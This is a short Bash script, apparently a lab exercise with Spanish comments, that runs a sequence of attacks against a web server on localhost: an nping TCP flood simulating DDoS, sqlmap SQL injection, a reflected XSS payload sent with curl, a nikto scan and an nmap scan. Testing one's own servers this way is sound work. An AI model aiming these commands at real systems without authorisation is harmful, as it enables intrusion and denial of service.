#!/bin/bash

TARGET_HOST="localhost"
TARGET_PORT="8097"
FULL_URL="https://${TARGET_HOST}:${TARGET_PORT}"

echo "======== ATAQUES AUTOMATIZADOS A LA GRANJA WEB ========"
echo "Objetivo: $FULL_URL"
echo "=======================================================\n"

# 1. Ataque DDoS con nping (simulación TCP flood)
echo " Simulando DDoS con nping..."
sudo nping --tcp -p $TARGET_PORT --rate 500 -c 2000 $TARGET_HOST
echo "******** Simulación de DDoS finalizada. ********"


# 2. Inyección SQL con sqlmap
echo " Inyección SQL con sqlmap..."
sqlmap -u "${FULL_URL}?q=test" --batch --random-agent --level=2 --risk=1 --ignore-code=404
echo "******** Inyección SQL simulada. ********"

# 3. XSS básico con curl
echo " Ataque XSS básico con curl..."
curl -k "${FULL_URL}?xss=<script>alert(1)</script>"
echo -e "******** Petición XSS enviada. Revisar navegador para ver si se refleja. ********"

# 4. Escaneo de vulnerabilidades con nikto
echo "Escaneo de vulnerabilidades web con nikto..."
nikto -h $FULL_URL
echo "******** Escaneo con nikto finalizado. ********"

# 5. Escaneo de puertos con nmap
echo " Escaneo de puertos con nmap..."
nmap -sV $TARGET_HOST -p $TARGET_PORT
echo "******** Escaneo de puertos finalizado. ********"

echo "******** Todos los ataques fueron ejecutados. ********"
